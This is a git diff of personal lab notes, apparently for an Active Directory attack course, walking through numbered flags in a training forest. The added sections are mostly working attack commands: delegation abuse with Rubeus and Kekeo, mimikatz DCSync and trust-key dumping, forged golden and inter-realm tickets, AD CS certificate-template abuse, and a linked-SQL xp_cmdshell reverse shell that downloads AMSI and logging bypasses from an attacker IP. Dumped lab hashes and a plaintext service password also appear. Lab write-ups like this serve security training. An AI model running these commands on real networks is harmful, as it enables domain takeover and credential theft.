@@ -291,7 +291,7 @@ Set-MpPreference -DisableRealtimeMonitoring $true -Verbose
 ```
 We cannot use the dot sourcing, so we need to use  a script that run mimikatz by itself
 ```powershell
-Copy-Item C:\AD\Tools\Invoke-MimiEx.ps1 \\dcorp-adminsrv.dollarcorp.moneycorp.local\c$\'Program Files
+Copy-Item C:\AD\Tools\Invoke-MimiEx.ps1 \\dcorp-adminsrv.dollarcorp.moneycorp.local\c$\'Program Files'
 ```
 ```powershell
 .\Invoke-MimiEx.ps1
@@ -319,6 +319,14 @@ Copy-Item C:\AD\Tools\Invoke-MimiEx.ps1 \\dcorp-adminsrv.dollarcorp.moneycorp.lo
 | Password    | AServicewhichIsNotM3@nttoBe                                      |
 | aes256_hmac | 2d84a12f614ccbf3d716b8339cbbe1a650e5fb352edc8e879470ade07e5412d7 |
 | rc4_hmac_nt | cc098f204c5887eaa8253e7c2749156f                                 |
+
+`dcorp-adminsrv$- DCORP-ADMINSRV`
+
+| Type        | Hash                                                             |
+| ----------- | ---------------------------------------------------------------- |
+| Password    | null                                      |
+| aes256_hmac | e9513a0ac270264bb12fb3b3ff37d7244877d269a97c7b3ebc3f6f78c382eb51 |
+| rc4_hmac_nt | b5f451985fd34d58d5120816d31b5565                                 |
 
 
 ### **FLAG 16/17 - hash krbgt/ hash domain administrator**
@@ -687,7 +695,7 @@ C:\AD\Tools\SafetyKatz.exe "lsadump::dcsync /user:mcorp\krbtgt /domain:moneycorp
 
 
 
-### **FLAG 26 - Value of msds-allowedtodelegate to attribute of dcorp-adminsrv**
+### **FLAG 26/27 - Value of msds-allowedtodelegate to attribute of dcorp-adminsrv**
 - Enumerate users in the domain for who Constrained Delegation is enabled.
    - For such a user, request a TGT from the DC and obtain a TGS for the service to which delegation is configured.
    - Pass the ticket and access the service.
@@ -702,7 +710,349 @@ Import powerview and use it
 Get-DomainUser -TrustedToAuth
 ```
 ![[Pasted image 20231026123711.png]]
-We already pwnd the account websvc, so we can request a TGT as domain administrator to access the mssql server
+We already pwnd the account websvc, so we can request a TGT as domain administrator to access the mssql server with S4U
 ```powerview
-C:\AD\Tools\Rubeus.exe s4u /user:websvc /aes256:2d84a12f614ccbf3d716b8339cbbe1a650e5fb352edc8e879470ade07e5412d7 /impersonateuser:Administrator /msdsspn:"CIFS/dcorpmssql.dollarcorp.moneycorp.LOCAL" /ptt
+C:\AD\Tools\Rubeus.exe s4u /user:websvc /aes256:2d84a12f614ccbf3d716b8339cbbe1a650e5fb352edc8e879470ade07e5412d7 /impersonateuser:Administrator /msdsspn:"CIFS/dcorp-mssql.dollarcorp.moneycorp.LOCAL" /ptt
 ```
+Try access the mssql server
+```cmd
+dir \\dcorp-mssql.dollarcorp.moneycorp.local\c$
+```
+![[Pasted image 20231106114056.png]]
+
+*Abuse Constrained Delegation using websvc with Kekeo*
+Try use kekeo to abuse Constrained Delegation. We can also use NTLM hash of websvc
+First we request a tgt
+```kekeo
+tgt::ask /user:websvc /domain:dollarcorp.moneycorp.local /rc4:cc098f204c5887eaa8253e7c2749156f
+```
+![[Pasted image 20231106121112.png]]
+Aftert that we can use the S4U technique
+```kekeo
+tgs::s4u /tgt:TGT_websvc@DOLLARCORP.MONEYCORP.LOCAL_krbtgt~ dollarcorp.moneycorp.local@DOLLARCORP.MONEYCORP.LOCAL.kirbi /user:Administrator@dollarcorp.moneycorp.local /service:cifs/dcorpmssql.dollarcorp.moneycorp.LOCAL
+```
+Now use invoke-mimi to use the ticker
+```powershell
+Invoke-Mimi -Command '"kerberos::ptt TGS_Administrator@dollarcorp.moneycorp.local@DOLLARCORP.MONEYCORP.LOCAL_cifs~dcorp-mssql.dollarcorp.moneycorp.LOCAL@DOLLARCORP.MONEYCORP.LOCAL.kirbi"'
+```
+*Abuse Constrained Delegation using dcorp-adminsrv with Rubeus*
+
+We have AES hash of dcorp-adminsrv$ from dcorp-adminsrv machine.
+First use Rubeus to obtain and import a ticket
+```cmd
+C:\AD\Tools\Rubeus.exe s4u /user:dcorp-adminsrv$ /aes256:e9513a0ac270264bb12fb3b3ff37d7244877d269a97c7b3ebc3f6f78c382eb51 /impersonateuser:Administrator /msdsspn:time/dcorp-dc.dollarcorp.moneycorp.LOCAL /altservice:ldap /ptt
+```
+Now use safetykatz to dcsync dollarcorp.moneycorp.local
+```cmd
+C:\AD\Tools\SafetyKatz.exe "lsadump::dcsync /user:dcorp\krbtgt" "exit"
+```
+![[Pasted image 20231106152932.png]]
+
+### **FLAG 28 - Computer account on which ciadmin can configure Resource-based Constrained Delegation*
+
+• Find a computer object in dcorp domain where we have Write permissions. 
+• Abuse the Write permissions to access that computer as Domain Admin.
+
+*Find a computer object in dcorp domain where we have Write permissions*
+Using PowerView we can look for interesting ACL (Permission)
+```powerview
+Find-InterestingDomainACL
+```
+To look for something on ciadmin
+```powerview
+Find-InterestingDomainACL | ?{$_.identityreferencename -match 'ciadmin'}
+```
+![[Pasted image 20231113115334.png]]
+*Abuse the Write permissions to access that computer as Domain Admin.*
+We already pwned ciadmin (I didn't saved the credentials...)
+But we can access also with the reverse shell from jenkill
+Now as persistence move(can also be a privesc btw) we can permit the delegation to dcorp-mgmt from our attack box to gain access as administrator on the machine on request
+Using powerview
+```powerview
+Set-DomainRBCD -Identity dcorp-mgmt -DelegateFrom 'dcorp-student115$' -Verbose
+```
+Check if is setted
+```powerview
+Get-DomainRBCD
+```
+Now from your attack box (or whatever machine you configured)you can abuse the delegation
+### **FLAG 29 - SID history injected to escalate to Enterprise Admins**
+*Using DA access to dollarcorp.moneycorp.local, escalate privileges to Enterprise Admin or DA to 
+the parent domain, moneycorp.local using the domain trust key. *
+
+First we need to retrieve the trust key in for the trust between dollarcorp and moneycorp using mimikatz
+Grab the ticket for svcadmin account and spawn a shell
+```cmd
+C:\AD\Tools\Rubeus.exe asktgt /user:svcadmin /aes256:6366243a657a4ea04e406f1abc27f1ada358ccd0138ec5ca2835067719dc7011 /opsec /createnetonly:C:\Windows\System32\cmd.exe /show /ptt
+```
+Copy the loader on dcorp-dc, create the tunnel and use safetykatz to extract the key
+```cmd
+echo F | xcopy C:\AD\Tools\Loader.exe \\dcorp-dc\C$\Users\Public\Loader.exe /Y
+```
+```cmd
+winrs -r:dcorp-dc cmd
+```
+```cmd
+netsh interface portproxy add v4tov4 listenport=8080 listenaddress=0.0.0.0 connectport=80 connectaddress=172.16.100.115
+```
+```cmd
+C:\Users\Public\Loader.exe -path http://127.0.0.1:8080/SafetyKatz.exe
+```
+Extract the key
+```mimikatz
+lsadump::trust /patch
+```
+All this process to dump the key could be done with invoke-mimi (obs with the ticket)
+```mimikatz
+Invoke-Mimi -Command '"lsadump::trust /patch"' -ComputerName dcorp-dc.dollarcorp.moneycorp.local
+```
+![[Pasted image 20231113153820.png]]
+
+`Trust key - dcorp-dc -> mcorp-dc`
+
+| Type        | Hash                                                             |
+| ----------- | ---------------------------------------------------------------- |
+| aes256    | b15b7f4bc043a97ec2378a0c418ec75aa1270f38365d86a0b109b2084c4adb8a|
+| NTLM | 988f695ef97fb2f8523346c70795d802 |
+
+`Trust key - mcorp-dc -> dcorp-dc`
+
+| Type        | Hash                                                             |
+| ----------- | ---------------------------------------------------------------- |
+| aes256    | 1b788fc631ec90ca9d9649d0f8d134e957c44dce09b26f01eef51f852986a1cd|
+| NTLM | 988f695ef97fb2f8523346c70795d802 |
+
+Now you can frge a ticket with SID History of Enterprise Admins.Use BetterSafeyKatz
+```BetterSafetyKatz
+C:\AD\Tools\BetterSafetyKatz.exe "kerberos::golden /user:Administrator /domain:dollarcorp.moneycorp.local /sid:S-1-5-21-719815819-3726368948-3917688648 /sids:S-1-5-21-335606122-960912869-3279953914-519 /rc4:988f695ef97fb2f8523346c70795d802 /service:krbtgt /target:moneycorp.local /ticket:C:\AD\Tools\trust_tkt.kirbi" "exit"
+```
+![[Pasted image 20231113155053.png]]
+Now use rubeus to use the ticket and get access on mcorp-dc
+```cmd
+C:\AD\Tools\Rubeus.exe asktgs /ticket:C:\AD\Tools\trust_tkt.kirbi /service:cifs/mcorp-dc.moneycorp.local /dc:mcorp-dc.moneycorp.local /ptt
+```
+![[Pasted image 20231113155312.png]]
+Test it
+![[Pasted image 20231113155355.png]]
+
+### **FLAG 30 - *NTLM hash of krbtgt of moneycorp.local*
+
+*Using DA access to dollarcorp.moneycorp.local, escalate privileges to Enterprise Admin or DA to the parent domain, moneycorp.local using dollarcorp's krbtgt hash*
+
+With the hash of krbtgt account from dcorp-dc we can create an inter-realm TGT and inject. Using Rubeus
+```Rubeus
+C:\AD\Tools\BetterSafetyKatz.exe "kerberos::golden /user:Administrator /domain:dollarcorp.moneycorp.local /sid:S-1-5-21-719815819-3726368948-3917688648 /sids:S-1-5-21-335606122-960912869-3279953914-519 /krbtgt:4e9815869d2090ccfca61c1fe0d23986 /ptt" "exit"
+```
+![[Pasted image 20231113161101.png]]
+Test it
+![[Pasted image 20231113161326.png]]
+Now we can also run a DC-Sync against mcorp-dc to extract the his secrets
+```cmd
+C:\AD\Tools\SafetyKatz.exe "lsadump::dcsync /user:mcorp\krbtgt /domain:moneycorp.local" "exit"
+```
+`krbTGT - mcorp-dc`
+
+| Type        | Hash                                                             |
+| ----------- | ---------------------------------------------------------------- |
+| aes256    | 90ec02cc0396de7e08c7d5a163c21fd59fcb9f8163254f9775fc2604b9aedb5e|
+| NTLM | a0981492d5dfab1ae0b97b51ea895ddf |
+
+
+### **FLAG 31/32 - Service for which a TGS is requested from eurocorp-dc AND Contents of secret.txt on eurocorp-dc**
+
+*With DA privileges on dollarcorp.moneycorp.local, get access to SharedwithDCorp share on the DC of eurocorp.local forest.*
+The trust key between  dollarcorp and eurocorp is needed
+Grab the ticket for svcadmin account and spawn a shell
+```cmd
+C:\AD\Tools\Rubeus.exe asktgt /user:svcadmin /aes256:6366243a657a4ea04e406f1abc27f1ada358ccd0138ec5ca2835067719dc7011 /opsec /createnetonly:C:\Windows\System32\cmd.exe /show /ptt
+```
+Copy the loader on dcorp-dc, create the tunnel and use safetykatz to extract the key
+```cmd
+echo F | xcopy C:\AD\Tools\Loader.exe \\dcorp-dc\C$\Users\Public\Loader.exe /Y
+```
+```cmd
+winrs -r:dcorp-dc cmd
+```
+```cmd
+netsh interface portproxy add v4tov4 listenport=8080 listenaddress=0.0.0.0 connectport=80 connectaddress=172.16.100.115
+```
+```cmd
+C:\Users\Public\Loader.exe -path http://127.0.0.1:8080/SafetyKatz.exe
+```
+Extract the key
+```mimikatz
+lsadump::trust /patch
+```
+![[Pasted image 20231113164739.png]]
+All this process to dump the key could be done with invoke-mimi (obs with the ticket)
+```mimikatz
+Invoke-Mimi -Command '"lsadump::trust /patch"' -ComputerName dcorp-dc.dollarcorp.moneycorp.local
+```
+
+`Trust key - dcorp-dc -> eurocorp-dc`
+
+| Type        | Hash                                                             |
+| ----------- | ---------------------------------------------------------------- |
+| aes256    | b498d4487775dbbb3ffcbcb189609416998263ae71f1ea96a8c61d7a6c8e565a|
+| NTLM | 8c03a02ed433a4408a5cdf8136692b03 |
+
+`Trust key - eurocorp-dc -> dcorp-dc`
+
+| Type        | Hash                                                             |
+| ----------- | ---------------------------------------------------------------- |
+| aes256    | 4790c156625ac9e7a888e4a957dc08c868dea0710a8f1a24385bf784333f1b80|
+| NTLM | 8c03a02ed433a4408a5cdf8136692b03 |
+
+And now craft an Inter-Realm TGT  use it with Rubeus
+```bettersafetykatz
+C:\AD\Tools\BetterSafetyKatz.exe "kerberos::golden /user:Administrator /domain:dollarcorp.moneycorp.local /sid:S-1-5-21-719815819-3726368948-3917688648 /rc4:8c03a02ed433a4408a5cdf8136692b03 /service:krbtgt /target:eurocorp.local /ticket:C:\AD\Tools\trust_forest_tkt.kirbi" "exit"
+```
+```cmd
+C:\AD\Tools\Rubeus.exe asktgs /ticket:C:\AD\Tools\trust_forest_tkt.kirbi /service:cifs/eurocorp-dc.eurocorp.local /dc:eurocorp-dc.eurocorp.local /ptt
+```
+![[Pasted image 20231113165304.png]]
+Check if we have access to the shared folder on eurocorp-dc
+![[Pasted image 20231113165804.png]]
+
+### **FLAG 33/34/35/36 - ADCS**
+- Check if AD CS is used by the target forest and find any vulnerable/abusable templates. 
+- Abuse any such template(s) to escalate to Domain Admin and Enterprise Admin.
+
+*Check if AD CS is used by the target forest and find any vulnerable/abusable templates.*
+Use Certify to check for ADCS presence
+```cmd
+C:\AD\Tools\Certify.exe cas
+```
+to list all templates
+```cmd
+C:\AD\Tools\Certify.exe find
+```
+*ESC1*
+ To look for ESC1 using certify
+ ```cmd
+C:\AD\Tools\Certify.exe find /enrolleeSuppliesSubject
+```
+![[Pasted image 20231115104637.png]]
+Let's request a certificate for Enterprise Administrator - Administrator (you can choose every account)
+ ```cmd
+C:\AD\Tools\Certify.exe request /ca:mcorp-dc.moneycorp.local\moneycorp-MCORP-DC-CA /template:"HTTPSCertificates" /altname:administrator
+```
+![[Pasted image 20231115122934.png]]
+Copy the RSA Private Key and use openssl to convert it to pkcs12
+```cmd
+C:\AD\Tools\openssl\openssl.exe pkcs12 -in C:\AD\Tools\esc1-ea.pem -keyex -CSP "Microsoft Enhanced Cryptographic Provider v1.0" -export -out C:\AD\Tools\esc1-EA.pfx
+```
+![[Pasted image 20231115123809.png]]
+Now use rubeus to print a TGT to access as enterprise administrator
+```cmd
+C:\AD\Tools\Rubeus.exe asktgt /user:moneycorp.local\Administrator /dc:mcorp-dc.moneycorp.local /certificate:esc1-EA.pfx /password:bruno /ptt
+```
+![[Pasted image 20231115124038.png]]
+
+*ESC3*
+Use certify to find the vulnerable template
+```cmd
+C:\AD\Tools\Certify.exe find /vulnerable
+```
+![[Pasted image 20231115124542.png]]
+The "SmartCardEnrollment-Agent" template has EKU for Certificate Request Agent and grants enrollment rights to Domain users. If we can find another template that has an EKU that allows for domain authentication and has application policy requirement of certificate request agent, we can request certificate on behalf of any user.
+![[Pasted image 20231115124740.png]]
+Now use certify to request the vulnerable template certificate
+```cmd
+C:\AD\Tools\Certify.exe request /ca:mcorp-dc.moneycorp.local\moneycorp-MCORP-DC-CA /template:SmartCardEnrollment-Agent
+```
+![[Pasted image 20231115125330.png]]Now save the id rsa and the certificate in one file like "esc3.pem" and coverti it with openssl
+```cmd
+C:\AD\Tools\openssl\openssl.exe pkcs12 -in C:\AD\Tools\esc3.pem -keyex -CSP "Microsoft Enhanced Cryptographic Provider v1.0" -export -out C:\AD\Tools\esc3-agent.pfx
+```
+![[Pasted image 20231115125649.png]]
+Now we can request the certificate as Enterprise Administrator
+```cmd
+C:\AD\Tools\Certify.exe request /ca:mcorp-dc.moneycorp.local\moneycorp-MCORP-DC-CA /template:SmartCardEnrollment-Users /onbehalfof:mcorp\administrator /enrollcert:C:\AD\Tools\esc3-agent.pfx /enrollcertpw:bruno
+```
+Now save the id rsa and the certificate in one file like "esc3-ea.pem" and coverti it with openssl
+```cmd
+C:\AD\Tools\openssl\openssl.exe pkcs12 -in C:\AD\Tools\ESC3-EA.pem -keyex -CSP "Microsoft Enhanced Cryptographic Provider v1.0" -export -out C:\AD\Tools\esc3-ea.pfx
+```
+Import it with rubeus
+```cmd
+C:\AD\Tools\Rubeus.exe asktgt /user:moneycorp.local\administrator /certificate:C:\AD\Tools\esc3-ea.pfx /dc:mcorp-dc.moneycorp.local /password:bruno /ptt
+```
+![[Pasted image 20231115130234.png]]
+*ESC 6*
+The CA in moneycorp has EDITF_ATTRIBUTESUBJECTALTNAME2 flag set.
+```cmd
+C:\AD\Tools\Certify.exe cas
+```
+![[Pasted image 20231115141409.png]]
+Look for a template that allow enrollment for normal user
+```cmd
+C:\AD\Tools\Certify.exe find
+```
+and request a certificate as any user you want using the "CA-integration" template
+```cmd
+C:\AD\Tools\Certify.exe request /ca:mcorp-dc.moneycorp.local\moneycorp-MCORP-DC-CA /template:"CA-Integration" /altname:moneycorp.local\administrator
+```
+![[Pasted image 20231115142421.png]]
+Save it and convert it
+```cmd
+C:\AD\Tools\openssl\openssl.exe pkcs12 -in C:\AD\Tools\esc6-ea.pem -keyex -CSP "Microsoft Enhanced Cryptographic Provider v1.0" -export -out C:\AD\Tools\esc6-ea.pfx
+```
+![[Pasted image 20231115142542.png]]
+Now use it with Rubeus to gain access
+```cmd
+C:\AD\Tools\Rubeus.exe asktgt /user:moneycorp.local\administrator /certificate:C:\AD\Tools\esc6-ea.pfx /dc:mcorp-dc.moneycorp.local /password:bruno /ptt
+```
+![[Pasted image 20231115142707.png]]
+
+### **FLAG 37/38/39/40 - SQL**
+
+- Get a reverse shell on a SQL server in eurocorp forest by abusing database links from dcorpmssql.
+
+Let’s start with enumerating SQL servers in the domain and if we has privileges to connect to any of them. We can use PowerUpSQL module for that.
+==USE INVISHELL==
+If you have ticket in the klist this will not work
+```powershell
+Import-Module C:\AD\Tools\PowerUpSQL-master\PowerupSQL.psd1
+```
+```powershell
+Get-SQLInstanceDomain | Get-SQLServerinfo -Verbose
+```
+![[Pasted image 20231115161040.png]]
+So, we can connect to dcorp-mssql. Using HeidiSQL client, let’s login to dcorp-mssql using our windows.
+To check other database links
+```sql
+select * from master..sysservers
+```
+![[Pasted image 20231115161752.png]]
+Enumerate further
+```sql
+select * from openquery("DCORP-SQL1",'select * from master..sysservers')
+```
+![[Pasted image 20231115161947.png]]
+We can concatenate the query to enumerate more further
+```sql
+select * from openquery("DCORP-SQL1",'select * from openquery("DCORP-MGMT",''select * from master..sysservers'')')
+```
+![[Pasted image 20231115162150.png]]
+It's possible also to use powersql to crawl all link without launch queries
+```powersql
+Get-SQLServerLinkCrawl -Instance dcorp-mssql.dollarcorp.moneycorp.local -Verbose
+```
+![[Pasted image 20231115162316.png]]
+So we have the sysadmin from eu-sql server
+If xp_cmdshell is enabled ==(or RPC out is true - which is set to false in this case)==, it is possible to execute commands on eu-sql using linked databases. To avoid dealing with a large number of quotes and escapes, we can use the following command:
+```powersql
+Get-SQLServerLinkCrawl -Instance dcorp-mssql.dollarcorp.moneycorp.local -Query "exec master..xp_cmdshell 'whoami'"
+```
+![[Pasted image 20231115164116.png]]
+To retrieve a reverse shell
+```powersql
+Get-SQLServerLinkCrawl -Instance dcorp-mssql -Query 'exec master..xp_cmdshell ''powershell -c "iex (iwr -UseBasicParsing http://172.16.100.115/sbloggingbypass.txt);iex (iwr -UseBasicParsing http://172.16.100.115/amsibypass.txt);iex (iwr -UseBasicParsing http://172.16.100.115/Invoke-PowerShellTcpEx.ps1)"''' -QueryTarget eu-sql15
+```
+![[Pasted image 20231115163650.png]]
+
+
+
+**KNOW WHAT!?!?!?**
+![[Pasted image 20231115164218.png]]
